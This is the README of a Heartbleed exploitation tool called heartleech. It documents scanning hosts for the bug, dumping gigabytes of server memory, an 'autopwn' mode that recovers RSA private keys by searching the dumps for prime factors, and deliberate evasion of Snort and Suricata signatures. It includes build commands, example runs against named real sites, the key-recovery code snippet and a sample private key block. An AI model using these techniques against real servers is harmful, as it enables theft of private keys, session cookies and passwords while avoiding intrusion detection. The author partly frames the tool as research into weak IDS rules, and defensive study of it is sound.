heartleech
==========

This is a typical "heartbleed" tool. It can scan for systems vulnerable to the
bug, and then be used to download them. Some important features:

  - conclusive/inconclusive verdicts as to whether the target is vulnerable
  - bulk/fast download of heartbleed data into a large files for offline
    processing
  - automatic retrieval of private keys with no additional steps
  - some limited IDS evasion
  - STARTTLS support
  - IPv6 support
  - Tor/Socks5n proxy support
  - extensive connection diagnostic information
  

#Building#

This is tricky. The `Makefile` is likely to fail.

This project uses the `ssl3_write_bytes()` function in order to send
heartbeats encrypted after the SSL handshake is complete. This function is
sometimes exported in OpenSSL libraries, and sometimes not.

If that's the trouble, then you have to download and build OpenSSL, then
link this tool with their object files. I did this on Kali Linux (a Debian
system) using the following steps:

    git clone git://git.openssl.org/openssl.git
    cd openssl
    ./config
    make depend
    make

    gcc ../heartleech/heartleech.c libssl.a libcrypto.a -ldl -lpthread -o heartleech

On Cygwin (and maybe other platforms), the order in which you link the
libraries apparently matters, so do "`libcrypto.a`" first, then "`libssl.a`", 
then "`-ldl`". Conversely, on Kali Linux, `libssl.a` must come before
`libcrypto.a`.

On Windows with VisualStudio, this is the guide I use for building:
    
    http://developer.covenanteyes.com/building-openssl-for-visual-studio/

The VisualStudio 2010 project looks for a 32-bit version in "..\openssl32"
and a 64-bit version in "..\openssl64" (in other words, the "openssl" directory
is at the same level as the "heartleech" directory). Apparently, configuring
OpenSSL for one 32/64 bits leaves artifacts behind that disrupt the other
build, so you need two separate directories to build the two different sizes.

Mac OS X includes OpenSSL/0.9.8, which doesn't support heartbeats (Jon Callas
has an excellent post as to why). This causes problems: you have to make sure
to get the right include headers. Also, there is a special step for building.
The full sequence of commands is:

    git clone git://git.openssl.org/openssl.git
    cd openssl
    ./Configure darwin64-x86_64-cc
    make depend
    make

    gcc ../heartleech/heartleech.c libssl.a libcrypto.a -ldl -lpthread -o heartleech -I./include

This makes the 64-bit version. If you want 32-bit, PowerPC, and/or univeral
executables, there are some extra steps to do. It starts with having a separate
directory for each version of the OpenSSL library that you need.


#Running#

Here is an example for scanning:

    ./heartleech --scan www.google.com www.cloudflarechallenge.com www.robertgraham.com oa8gs7diyfuahl.com

    --- heartleech/1.0.0e ---
    from https://github.com/robertdavidgraham/heartleech
    www.google.com:443: SAFE
    www.cloudflarechallenge.com:443: VULNERABLE
    www.robertgraham.com:443: INCONCLUSIVE: TCP connect failed
    oa8gs7diyfuahl.com:443: INCONCLUSIVE: DNS failed

A big feature of this program is that it is conclusive as to whether a target
is "SAFE" or "VULNERABLE". Otherwise, the target is marked "INCONCLUSIVE".
Instead of a single target, you can use `--scanlist <filename>` to read
from a file. Instead of the default port, you can scan different ports,
such as `www.google.com:25`. You can specify a range of IPv4 addresses by
using a dash, such as `10.0.0.0-10.0.0.255`. Scanning a lot of addresses can
be slow, so you can use lots of threads, such as `--threads 100`.


Here is an example of dumping bleed information:

    ./heartleech www.cloudflarechallenge.com --dump challenge.bin

    --- heartleech/1.0.0e ---
    from https://github.com/robertdavidgraham/heartleech
    7091376634 bytes downloaded

In this example, the script keeps reconnecting to the server, dumping more
and more information, sending up to a million requests. This will download
many gigabytes of information. The data is dumped to a file for later offline
analysis. Such analysis will include greping for cookies and passwords,
or searching for private certificates.

To search an offline file for a private-key, use the following example:

    ./heartleech --cert cloudflare.pem --read challenge.bin
    
where `challenge.bin` is the file you saved in the previous step, and
the `cloudflare.pem` is the certificate, which you can grab from your
browser, using the OpenSSL command-line tool, saving from Wireshark, or
through some other means.

To automate the last two steps, do the following:

    ./heartleech www.cloudflarechallenge.com --autopwn
    
This will automatically fetch the certificate from the website, then continue
downloading information until it finds a matching private key within the
heartbleed information.

This tool supports IPv6. It may actually be using IPv6 without you knowing,
if the first response from a DNS query of a domain name is an IPv6 address,
then it will use IPv6 to connection. If you want to force the tool to use
one or the other, use "--ipv4" or "--ipv6" on the command-line.

This tool support Tor Socks5n proxying. That means it sends the target domain
name through Socks to the Tor servers, which will then resolve the DNS name
for us. To enabled this use the `--proxy <hostname:port>` option. If the port
is not specified, it defaults to 9150.

This tool supports STARTTLS. It automatically chooses this when a port is 
selected that requires STARTTL for SSL, such as port 25 for SMTP.

This tool supports extensive disagnostics of the connection with the `-d` 
option. Here is an example and the output:

    ./heartleech --scan smtp.gmail.com:25 --proxy 10.20.30.156:9150 -d

    --- heartleech/1.0.0e ---
    from https://github.com/robertdavidgraham/heartleech

    [ ] resolving "10.20.30.156"
    [+]  10.20.30.156
    [+]  10.20.30.156
    [ ] 10.20.30.156: connecting...
    [+] 10.20.30.156: connected
    [+] proxy connected through: 0.0.0.0:0
    [+] 220 mx.google.com ESMTP ct2sm59082475wjb.33 - gsmtp
    [+] 250-mx.google.com at your service, [93.174.95.82]
    [+] 250-SIZE 35882577
    [+] 250-8BITMIME
    [+] 250-STARTTLS
    [+] 250-ENHANCEDSTATUSCODES
    [+] 250 CHUNKING
    [+] 220 2.0.0 Ready to start TLS
    [+] SMTP STARTTLS engaged
    [ ] SSL handshake started...
    [+] SSL handshake complete [ECDHE-RSA-AES128-GCM-SHA256]
    [+] servername = smtp.gmail.com
    [+] RSA public-key length = 2048-bits
    [-] target doesn't support heartbeats
    smtp.gmail.com:25: SAFE



#Design#

This tool is designed first and foremost to just grab the heartbleed info.

Secondarily, it can be used in "auto-pwn" mode to grab the private-key. It
does this by using the trick search for primes. As you know, the RSA algorithm
works by generating two random primes `p` and `q`, then multiplying them
together. The public-key is the product of the two primes, `p * q`, and the
private-key is the original primes. The security rests on the fact that nobody
knows how to factor a large number, getting those two primes from the public
key.

There are four things we can use to find the private key. The first is to
search for the well know file contents that looks like this:

    -----BEGIN RSA PRIVATE KEY-----
    MIICXQIBAAKBgQDEN1rijw5WN9HkzAcMBmYIcZ9oj9zf7ihbrFy3WClAlEfkZSRj
    EbRRwIYUS2KQBFUfXpte7d1zhqGXhVJ6QfpoqRXQd4VmHQnoL7GnJ0/wVuWk3PWQ
    hCAPBuPtJdQiSK9ibQQrL64hmcrPtMS0S1CMmwFANzJpcG34FVo5K49WWwIDAQAB
    AoGADl47UoHFO/0EaquiDHhfeljPonl+ZAtteyEI/QgApVD2XrwlSPff62icqNnI
    UuFuVki4OeBTKgV+ybiijH9OVcCnPokkvPURod/ZKomddtgwZsiOkKO8DziXZ36+
    7czfwxhpgTx++GnfWnVGiouvtWKbUGh5195sI/tzhkBRffECQQD3n75V7JpBY7rI
    baZivrunb5qEIickYcw9bCh8DLt8pagUN9B1U0Sawq6FYwNKeoSPE1aitFXXfD2U
    7sF62DpDAkEAytp0ektIDd4+0kW+JvzUk8Mf5n12lmJMJBETVpehD0Z9JshRqMso
    fKuc23iIShB+Pbc7y4fR+DeI6b+AO9nuCQJAJdFex06oTF5H035zj9cjX7H6vj1d
    DwBkqejP0go7xBCkt9nCW3jJHH2pG7QAd6p4fkVs0NKL3aoa2ZkRMYq+cwJBAKSw
    XPZYniQcNlaSpsGSbKeWOBTx8VBAd96kOlYH/oufR8YvxhRK9BDbZxrLraKr50IF
    vDcOisqBk9dqURrGYLkCQQDiSnxymNmkHMR/E0i3J7ekpCLO7kLa9mm3gqOc5BLy
    afouRBtYU13ju5OulbVCiqoBp8Gr1lpE87kbq0j8mFHT
    -----END RSA PRIVATE KEY-----

This text form is just the BASE64 encoding of the binary form in what's known
as the "ASN.1 DER" format:

    0000000 30 82 02 5d 02 01 00 02 81 81 00 c4 37 5a e2 8f
    0000010 0e 56 37 d1 e4 cc 07 0c 06 66 08 71 9f 68 8f dc
    0000020 df ee 28 5b ac 5c b7 58 29 40 94 47 e4 65 24 63
    . . . .
    
The third form is internal data structures, generated by parsing the ASN.1 DER
external format:

    struct rsa_st {
        BIGNUM *n;  // p * q, the public key
        BIGNUM *e;  // a small number, like 65537
        BIGNUM *d;  // (p-1) * (q-1), the real private key
        BIGNUM *p;  // randomly generated prime
        BIGNUM *q;  // randomly generated prime
        BIGNUM *dmp1;
        BIGNUM *dmq1;
        BIGNUM *iqmp;
    };

The fourth form is intermediate products produced in memory while working
with the private key. Others have looking into that and have concluded
that OpenSSL zeroes them out before something else has a change to grab
them.

People have been unsuccessful at finding either the BASE64 private-key or
the ASN.1 DER private key, but very successful at finding `p` or `q` in BIGNUM
format.

The ASN.1 DER format will have the key in "big-endian" format, from high-byte
to low-byte. The BIGNUM format will have the bytes in reverse order on a
"little-endian" machines like x86 and most ARM Linux.

To look for a prime factor, I just go through the heartbleed buffers one byte
at a time with the following code, first constructing a BIGNUM variable from
the current byte (followed by the next 128 bytes), then dividing into the
public-key, then testing if the remainder is zero.

        p.d = (BN_ULONG*)(buf+i);
        p.dmax = n->top/2;
        p.top = p.dmax;

        BN_div(&q, &remainder, n, &p, ctx);
        if (BN_is_zero(&remainder))
            printf("FOUND PRIVATE KEY");
            
The code automatically grabs the public-key, `n`, when it connects to the
server. When it finds one prime `p` in the buffer, the division check then
calculates what the other prime `q` must be. I then use these two numbers
to recreate the origin private key file. Note that the private-key my code
generates may not quite match the original one on the server. For example, I 
may reverse the order of `p` and `q`. Also, there are some optional fields.
Regardless of whehther my found private-key matches the original one, it can
be used in place of the original one.



#Discussion#

This should be a useful tool on its own, but I wrote it primarily because the
pattern-matching rules for Snort are inadequate. IDS vendors won't fix their
stuff until I can prove they are inadequate.

The problem with the signatures is that they trigger on the heartbeat pattern
as the start of the TCP payload, looking for a pattern like this:

    18 03 02 00 03 01 40 00

However, TCP is a not a "packet" protocol but a "streaming" protocol. While
this bytes may be typically at the start of the TCP payload, they don't have
to be.

Therefore, I created this tool such that these bytes don't appear at the
start of a packet's payload. Instead, they appear in the middle.

The IDSs look for these patterns both coming from the attacker and also
coming from the server. Therefore, I have to manipulate both sides of the 
connection in order to cause the evasion.

I do this on the client side by sending an HTTP GET request back-to-back with
a heartbeat request. This was the most difficult part of the program. Normally,
with an SSL API, you let the underlying library take care of network/sockets
communications for you. However, that creates two separate TCP packets on the
wire when I want just one packet with two SSL records. Therefore, I had to
use my own sockets communications, then use the OpenSSL "memory BIO" feature
to encrypt/decrypt data separately. There's not a lot of documentation on how
to do this, so it took a while to get it to work.

On the server side, the replies naturally come back together. I haven't tested
anywhere but the CloudFlare challenge server, but I think this should almost
always be the case. My tool looks for |18 03| as the packet header and warns 
you when this is the case.


#IDS References#

Here are some IDS links to the signatures in question. The key features of
all these rules is that they check for the pattern `|18 03|` at the start of
a TCP payload, which heartleech doens't generate.

    Sourcefire:
    http://vrt-blog.snort.org/2014/04/performing-heartbleed-attack-after-tls.html

    Fox-it:
    http://blog.fox-it.com/2014/04/08/openssl-heartbleed-bug-live-blog/
    
    EmergingThreat
    https://lists.emergingthreats.net/pipermail/emerging-sigs/2014-April/024056.html
    
    Suricata:
    http://blog.inliniac.net/2014/04/08/detecting-openssl-heartbleed-with-suricata/
    
The Bro intrusion-detection system doesn't use Snort rules, but instead bases
its detection on parsers. Hence, it detect heartleech:

    Bro:
    http://blog.bro.org/2014/04/detecting-heartbleed-bug-using-bro.html
    

#Other scripts#

Other people have different programs that do similar things to this:

      https://raw.githubusercontent.com/HackerFantastic/Public/master/exploits/heartbleed.c
      
#CREDITS

I go the idea for searching for primes in a tweet from Einar Otto Stangvik 
(@einaros). He probably got that idea from others, for example, 
Jeremi Gosney (@jmgosney) also successfully used the idea before I started 
coding it. Here are some links:

	https://gist.github.com/epixoip/10570627



